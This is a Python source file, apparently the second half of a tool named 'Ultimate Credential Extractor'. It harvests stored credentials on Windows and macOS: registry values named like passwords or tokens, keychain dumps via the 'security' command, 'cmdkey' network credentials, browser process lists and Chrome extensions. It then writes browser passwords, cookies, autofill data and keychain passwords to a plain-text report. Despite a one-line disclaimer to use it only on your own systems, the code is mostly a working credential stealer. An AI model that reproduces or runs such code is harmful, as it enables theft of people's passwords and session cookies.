                r"SOFTWARE\Microsoft\Windows\CurrentVersion\Internet Settings\Zones",
                r"SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon",
                r"SOFTWARE\Microsoft\Windows\CurrentVersion\Authentication\LogonUI",
                r"SOFTWARE\Microsoft\Windows\CurrentVersion\Credential Manager",
                r"SOFTWARE\Microsoft\Windows\CurrentVersion\Internet Settings\AutoConfigURL",
                r"SOFTWARE\Microsoft\Windows\CurrentVersion\Internet Settings\Connections",
                r"SOFTWARE\Microsoft\Windows\CurrentVersion\Internet Settings\5.0\Cache",
                r"SOFTWARE\Microsoft\Windows\CurrentVersion\Internet Settings\5.0\Cookies"
            ]
            
            for path in registry_paths:
                try:
                    key = winreg.OpenKey(winreg.HKEY_CURRENT_USER, path)
                    self._read_registry_key_ultimate(key, path)
                    winreg.CloseKey(key)
                except:
                    try:
                        key = winreg.OpenKey(winreg.HKEY_LOCAL_MACHINE, path)
                        self._read_registry_key_ultimate(key, path)
                        winreg.CloseKey(key)
                    except:
                        continue
                        
        except Exception as e:
            self.log(f"Error extracting Windows Registry: {e}")
            
    def _read_registry_key_ultimate(self, key, path):
        """Read registry key values with ULTIMATE methods"""
        try:
            i = 0
            while True:
                try:
                    name, value, _ = winreg.EnumValue(key, i)
                    if any(keyword in name.lower() for keyword in ['password', 'secret', 'key', 'token', 'credential', 'auth']):
                        self.extracted_credentials['registry_credentials'].append({
                            'type': 'registry_entry',
                            'path': path,
                            'name': name,
                            'value': str(value)
                        })
                    i += 1
                except WindowsError:
                    break
        except Exception as e:
            self.log(f"Error reading registry key: {e}")
            
    def _extract_windows_keyring_ultimate(self):
        """Extract Windows Keyring credentials"""
        try:
            if KEYRING_AVAILABLE:
                # Get all keyring entries
                import keyring.backends
                backends = keyring.backends.get_all_keyring()
                
                for backend in backends:
                    try:
                        # This is a simplified example - real keyring extraction would be more complex
                        self.extracted_credentials['windows_credman'].append({
                            'type': 'keyring_backend',
                            'backend': str(backend),
                            'note': 'Keyring backend available'
                        })
                    except:
                        continue
                        
        except Exception as e:
            self.log(f"Error extracting Windows Keyring: {e}")
            
    def extract_macos_keychain_ultimate(self):
        """ULTIMATE macOS Keychain extraction"""
        self.log("Extracting macOS Keychain using ULTIMATE methods...")
        
        try:
            if self.system == 'darwin':
                # Method 1: Security command
                self._extract_macos_security_command()
                
                # Method 2: Keyring library
                self._extract_macos_keyring_library()
                
                # Method 3: Keychain files
                self._extract_macos_keychain_files()
                
        except Exception as e:
            self.log(f"Error extracting macOS Keychain: {e}")
            
    def _extract_macos_security_command(self):
        """Extract macOS Keychain using security command"""
        try:
            # Dump keychain
            result = subprocess.run(['security', 'dump-keychain'], 
                                  capture_output=True, text=True, timeout=60)
            if result.returncode == 0:
                lines = result.stdout.split('\n')
                current_entry = {}
                for line in lines:
                    if 'keychain:' in line.lower():
                        if current_entry:
                            self.extracted_credentials['macos_keychain'].append(current_entry)
                        current_entry = {'type': 'keychain_entry', 'keychain': line.strip()}
                    elif 'account:' in line.lower():
                        current_entry['account'] = line.split(':')[1].strip()
                    elif 'password:' in line.lower():
                        current_entry['password'] = line.split(':')[1].strip()
                    elif 'service:' in line.lower():
                        current_entry['service'] = line.split(':')[1].strip()
                
                if current_entry:
                    self.extracted_credentials['macos_keychain'].append(current_entry)
                    
        except Exception as e:
            self.log(f"Error extracting macOS security command: {e}")
            
    def _extract_macos_keyring_library(self):
        """Extract macOS Keychain using keyring library"""
        try:
            if KEYRING_AVAILABLE:
                # Get all keyring entries
                import keyring.backends
                backends = keyring.backends.get_all_keyring()
                
                for backend in backends:
                    try:
                        self.extracted_credentials['macos_keychain'].append({
                            'type': 'keyring_backend',
                            'backend': str(backend),
                            'note': 'Keyring backend available'
                        })
                    except:
                        continue
                        
        except Exception as e:
            self.log(f"Error extracting macOS keyring library: {e}")
            
    def _extract_macos_keychain_files(self):
        """Extract macOS Keychain files"""
        try:
            keychain_paths = [
                os.path.expanduser('~/Library/Keychains/login.keychain-db'),
                os.path.expanduser('~/Library/Keychains/login.keychain'),
                os.path.expanduser('~/Library/Keychains/System.keychain'),
                os.path.expanduser('~/Library/Keychains/System.keychain-db')
            ]
            
            for keychain_path in keychain_paths:
                if os.path.exists(keychain_path):
                    self.extracted_credentials['macos_keychain'].append({
                        'type': 'keychain_file',
                        'path': keychain_path,
                        'note': 'Keychain file found'
                    })
                    
        except Exception as e:
            self.log(f"Error extracting macOS keychain files: {e}")
            
    def extract_system_credentials_ultimate(self):
        """ULTIMATE system credential extraction"""
        self.log("Extracting system credentials using ULTIMATE methods...")
        
        if self.system == 'windows':
            self._extract_windows_system_credentials_ultimate()
        elif self.system == 'darwin':
            self._extract_macos_system_credentials_ultimate()
            
    def _extract_windows_system_credentials_ultimate(self):
        """ULTIMATE Windows system credential extraction"""
        try:
            # Extract from various Windows sources
            self._extract_windows_network_credentials()
            self._extract_windows_memory_credentials()
            self._extract_windows_service_credentials()
            
        except Exception as e:
            self.log(f"Error extracting Windows system credentials: {e}")
            
    def _extract_windows_network_credentials(self):
        """Extract Windows network credentials"""
        try:
            if WINDOWS_MODULES_AVAILABLE:
                # Get network credentials
                result = subprocess.run(['cmdkey', '/list'], 
                                      capture_output=True, text=True, timeout=30)
                if result.returncode == 0:
                    lines = result.stdout.strip().split('\n')
                    for line in lines:
                        if 'Target:' in line:
                            target = line.split('Target:')[1].strip()
                            self.extracted_credentials['network_credentials'].append({
                                'type': 'network_credential',
                                'target': target
                            })
                            
        except Exception as e:
            self.log(f"Error extracting Windows network credentials: {e}")
            
    def _extract_windows_memory_credentials(self):
        """Extract Windows memory credentials"""
        try:
            if PSUTIL_AVAILABLE:
                for proc in psutil.process_iter(['pid', 'name', 'memory_info']):
                    try:
                        if any(browser in proc.info['name'].lower() for browser in ['chrome', 'firefox', 'edge', 'safari', 'opera', 'brave']):
                            self.extracted_credentials['memory_credentials'].append({
                                'type': 'process_memory',
                                'process': proc.info['name'],
                                'pid': proc.info['pid'],
                                'note': 'Browser process found - memory extraction requires additional tools'
                            })
                    except:
                        continue
                        
        except Exception as e:
            self.log(f"Error extracting Windows memory credentials: {e}")
            
    def _extract_windows_service_credentials(self):
        """Extract Windows service credentials"""
        try:
            if WINDOWS_MODULES_AVAILABLE:
                # Get service credentials
                services = win32service.EnumServicesStatus()
                for service in services:
                    service_name = service[0]
                    if any(keyword in service_name.lower() for keyword in ['credential', 'auth', 'login', 'password']):
                        self.extracted_credentials['system_credentials'].append({
                            'type': 'service_credential',
                            'service_name': service_name,
                            'note': 'Service with credential-related name found'
                        })
                        
        except Exception as e:
            self.log(f"Error extracting Windows service credentials: {e}")
            
    def _extract_macos_system_credentials_ultimate(self):
        """ULTIMATE macOS system credential extraction"""
        try:
            # Extract from various macOS sources
            self._extract_macos_network_credentials()
            self._extract_macos_memory_credentials()
            
        except Exception as e:
            self.log(f"Error extracting macOS system credentials: {e}")
            
    def _extract_macos_network_credentials(self):
        """Extract macOS network credentials"""
        try:
            # Get network credentials
            result = subprocess.run(['security', 'find-internet-password'], 
                                  capture_output=True, text=True, timeout=30)
            if result.returncode == 0:
                lines = result.stdout.strip().split('\n')
                for line in lines:
                    if 'server:' in line.lower():
                        server = line.split(':')[1].strip()
                        self.extracted_credentials['network_credentials'].append({
                            'type': 'network_credential',
                            'server': server
                        })
                        
        except Exception as e:
            self.log(f"Error extracting macOS network credentials: {e}")
            
    def _extract_macos_memory_credentials(self):
        """Extract macOS memory credentials"""
        try:
            if PSUTIL_AVAILABLE:
                for proc in psutil.process_iter(['pid', 'name', 'memory_info']):
                    try:
                        if any(browser in proc.info['name'].lower() for browser in ['chrome', 'firefox', 'safari', 'opera', 'brave']):
                            self.extracted_credentials['memory_credentials'].append({
                                'type': 'process_memory',
                                'process': proc.info['name'],
                                'pid': proc.info['pid'],
                                'note': 'Browser process found - memory extraction requires additional tools'
                            })
                    except:
                        continue
                        
        except Exception as e:
            self.log(f"Error extracting macOS memory credentials: {e}")
            
    def extract_network_credentials_ultimate(self):
        """ULTIMATE network credential extraction"""
        self.log("Extracting network credentials using ULTIMATE methods...")
        
        # This is handled in the system credential extraction methods
        
    def extract_registry_credentials_ultimate(self):
        """ULTIMATE registry credential extraction"""
        self.log("Extracting registry credentials using ULTIMATE methods...")
        
        # This is handled in the Windows credential extraction methods
        
    def extract_memory_credentials_ultimate(self):
        """ULTIMATE memory credential extraction"""
        self.log("Extracting memory credentials using ULTIMATE methods...")
        
        # This is handled in the system credential extraction methods
        
    def extract_cache_credentials_ultimate(self):
        """ULTIMATE cache credential extraction"""
        self.log("Extracting cache credentials using ULTIMATE methods...")
        
        # This is handled in the browser credential extraction methods
        
    def extract_extension_credentials_ultimate(self):
        """ULTIMATE extension credential extraction"""
        self.log("Extracting extension credentials using ULTIMATE methods...")
        
        try:
            # Chrome extensions
            chrome_extensions_paths = [
                os.path.expanduser('~\\AppData\\Local\\Google\\Chrome\\User Data\\Default\\Extensions'),
                os.path.expanduser('~/Library/Application Support/Google/Chrome/Default/Extensions')
            ]
            
            for extensions_path in chrome_extensions_paths:
                if os.path.exists(extensions_path):
                    for extension_id in os.listdir(extensions_path):
                        extension_path = os.path.join(extensions_path, extension_id)
                        if os.path.isdir(extension_path):
                            # Look for extension data
                            for version in os.listdir(extension_path):
                                version_path = os.path.join(extension_path, version)
                                if os.path.isdir(version_path):
                                    # Look for manifest and data files
                                    manifest_file = os.path.join(version_path, 'manifest.json')
                                    if os.path.exists(manifest_file):
                                        try:
                                            with open(manifest_file, 'r', encoding='utf-8') as f:
                                                manifest = json.load(f)
                                                if 'name' in manifest:
                                                    self.extracted_credentials['extension_credentials'].append({
                                                        'browser': 'Chrome',
                                                        'extension_id': extension_id,
                                                        'extension_name': manifest['name'],
                                                        'version': version,
                                                        'note': 'Extension found'
                                                    })
                                        except:
                                            continue
                            
        except Exception as e:
            self.log(f"Error extracting extension credentials: {e}")
            
    def save_to_file(self, filename="output.txt"):
        """Save extracted credentials to a text file"""
        try:
            with open(filename, 'w', encoding='utf-8') as f:
                f.write("ULTIMATE CREDENTIAL EXTRACTION REPORT\n")
                f.write("=" * 70 + "\n")
                f.write(f"Generated: {self.extracted_credentials['timestamp']}\n")
                f.write(f"System: {self.extracted_credentials['system']}\n")
                f.write("=" * 70 + "\n\n")
                
                # Browser Passwords
                f.write("BROWSER PASSWORDS:\n")
                f.write("-" * 40 + "\n")
                for cred in self.extracted_credentials['browser_passwords']:
                    f.write(f"Browser: {cred['browser']}\n")
                    f.write(f"Profile: {cred.get('profile', 'N/A')}\n")
                    f.write(f"URL: {cred['url']}\n")
                    f.write(f"Username: {cred['username']}\n")
                    f.write(f"Password: {cred['password']}\n")
                    if 'date_created' in cred:
                        f.write(f"Date Created: {cred['date_created']}\n")
                    if 'date_modified' in cred:
                        f.write(f"Date Modified: {cred['date_modified']}\n")
                    if 'times_used' in cred:
                        f.write(f"Times Used: {cred['times_used']}\n")
                    f.write("\n")
                
                # Browser Cookies
                f.write("BROWSER COOKIES:\n")
                f.write("-" * 40 + "\n")
                for cred in self.extracted_credentials['browser_cookies']:
                    f.write(f"Browser: {cred['browser']}\n")
                    f.write(f"Profile: {cred.get('profile', 'N/A')}\n")
                    f.write(f"Host: {cred['host']}\n")
                    f.write(f"Name: {cred['name']}\n")
                    f.write(f"Value: {cred['value']}\n")
                    f.write(f"Path: {cred['path']}\n")
                    f.write(f"Expires: {cred['expires']}\n")
                    f.write(f"Secure: {cred['is_secure']}\n")
                    f.write("\n")
                
                # Browser Autofill
                f.write("BROWSER AUTOFILL:\n")
                f.write("-" * 40 + "\n")
                for cred in self.extracted_credentials['browser_autofill']:
                    f.write(f"Browser: {cred['browser']}\n")
                    f.write(f"Profile: {cred.get('profile', 'N/A')}\n")
                    f.write(f"Name: {cred['name']}\n")
                    f.write(f"Value: {cred['value']}\n")
                    if 'date_created' in cred:
                        f.write(f"Date Created: {cred['date_created']}\n")
                    if 'date_last_used' in cred:
                        f.write(f"Date Last Used: {cred['date_last_used']}\n")
                    f.write("\n")
                
                # Browser Sessions
                f.write("BROWSER SESSIONS:\n")
                f.write("-" * 40 + "\n")
                for cred in self.extracted_credentials['browser_sessions']:
                    f.write(f"Browser: {cred['browser']}\n")
                    f.write(f"Profile: {cred.get('profile', 'N/A')}\n")
                    f.write(f"Session File: {cred.get('session_file', 'N/A')}\n")
                    f.write(f"URL: {cred['url']}\n")
                    if 'title' in cred:
                        f.write(f"Title: {cred['title']}\n")
                    f.write("\n")
                
                # Windows Credential Manager
                f.write("WINDOWS CREDENTIAL MANAGER:\n")
                f.write("-" * 40 + "\n")
                for cred in self.extracted_credentials['windows_credman']:
                    f.write(f"Type: {cred['type']}\n")
                    f.write(f"Target: {cred['target']}\n")
                    if 'username' in cred:
                        f.write(f"Username: {cred['username']}\n")
                    if 'password' in cred:
                        f.write(f"Password: {cred['password']}\n")
                    if 'credential_type' in cred:
                        f.write(f"Credential Type: {cred['credential_type']}\n")
                    f.write("\n")
                
                # macOS Keychain
                f.write("macOS KEYCHAIN:\n")
                f.write("-" * 40 + "\n")
                for cred in self.extracted_credentials['macos_keychain']:
                    f.write(f"Type: {cred['type']}\n")
                    if 'keychain' in cred:
                        f.write(f"Keychain: {cred['keychain']}\n")
                    if 'account' in cred:
                        f.write(f"Account: {cred['account']}\n")
                    if 'password' in cred:
                        f.write(f"Password: {cred['password']}\n")
                    if 'service' in cred:
                        f.write(f"Service: {cred['service']}\n")
                    f.write("\n")
                
                # System Credentials
                f.write("SYSTEM CREDENTIALS:\n")
                f.write("-" * 40 + "\n")
                for cred in self.extracted_credentials['system_credentials']:
                    f.write(f"Type: {cred['type']}\n")
                    if 'service_name' in cred:
                        f.write(f"Service Name: {cred['service_name']}\n")
                    if 'note' in cred:
                        f.write(f"Note: {cred['note']}\n")
                    f.write("\n")
                
                # Network Credentials
                f.write("NETWORK CREDENTIALS:\n")
                f.write("-" * 40 + "\n")
                for cred in self.extracted_credentials['network_credentials']:
                    f.write(f"Type: {cred['type']}\n")
                    if 'target' in cred:
                        f.write(f"Target: {cred['target']}\n")
                    if 'server' in cred:
                        f.write(f"Server: {cred['server']}\n")
                    f.write("\n")
                
                # Registry Credentials
                f.write("REGISTRY CREDENTIALS:\n")
                f.write("-" * 40 + "\n")
                for cred in self.extracted_credentials['registry_credentials']:
                    f.write(f"Type: {cred['type']}\n")
                    f.write(f"Path: {cred['path']}\n")
                    f.write(f"Name: {cred['name']}\n")
                    f.write(f"Value: {cred['value']}\n\n")
                
                # Memory Credentials
                f.write("MEMORY CREDENTIALS:\n")
                f.write("-" * 40 + "\n")
                for cred in self.extracted_credentials['memory_credentials']:
                    f.write(f"Type: {cred['type']}\n")
                    f.write(f"Process: {cred['process']}\n")
                    f.write(f"PID: {cred['pid']}\n")
                    f.write(f"Note: {cred['note']}\n\n")
                
                # Extension Credentials
                f.write("EXTENSION CREDENTIALS:\n")
                f.write("-" * 40 + "\n")
                for cred in self.extracted_credentials['extension_credentials']:
                    f.write(f"Browser: {cred['browser']}\n")
                    f.write(f"Extension ID: {cred['extension_id']}\n")
                    f.write(f"Extension Name: {cred['extension_name']}\n")
                    f.write(f"Version: {cred['version']}\n")
                    f.write(f"Note: {cred['note']}\n\n")
                
                # Cache Credentials
                f.write("CACHE CREDENTIALS:\n")
                f.write("-" * 40 + "\n")
                for cred in self.extracted_credentials['cache_credentials']:
                    f.write(f"Browser: {cred['browser']}\n")
                    f.write(f"Profile: {cred.get('profile', 'N/A')}\n")
                    f.write(f"Storage Type: {cred['storage_type']}\n")
                    f.write(f"File: {cred['file']}\n")
                    f.write(f"Credential: {cred['credential']}\n\n")
                
                f.write("\n" + "=" * 70 + "\n")
                f.write("END OF ULTIMATE REPORT\n")
                f.write("=" * 70 + "\n")
                
            self.log(f"ULTIMATE credentials saved to: {filename}")
            return filename
            
        except Exception as e:
            self.log(f"Error saving ULTIMATE credentials to file: {e}")
            return None

def main():
    """Main application entry point"""
    try:
        print("=" * 70)
        print("ULTIMATE CREDENTIAL EXTRACTOR TOOL")
        print("=" * 70)
        print("WARNING: This tool extracts sensitive credentials from your system.")
        print("Only use this tool on systems you own and have permission to access.")
        print("=" * 70)
        
        extractor = UltimateCredentialExtractor()
        
        # Run extraction automatically
        extractor.extract_all_credentials()
        
        # Save to file
        filename = extractor.save_to_file()
        if filename:
            print(f"\nULTIMATE extraction completed successfully!")
            print(f"Results saved to: {filename}")
            print("\nIMPORTANT SECURITY NOTES:")
            print("- The extracted file contains sensitive information")
            print("- Store it securely and delete it when no longer needed")
            print("- Do not share this file with unauthorized parties")
        else:
            print("Failed to save ULTIMATE credentials to file.")
            
    except KeyboardInterrupt:
        print("\nULTIMATE extraction interrupted by user.")
    except Exception as e:
        print(f"An error occurred: {e}")

if __name__ == "__main__":
    main()
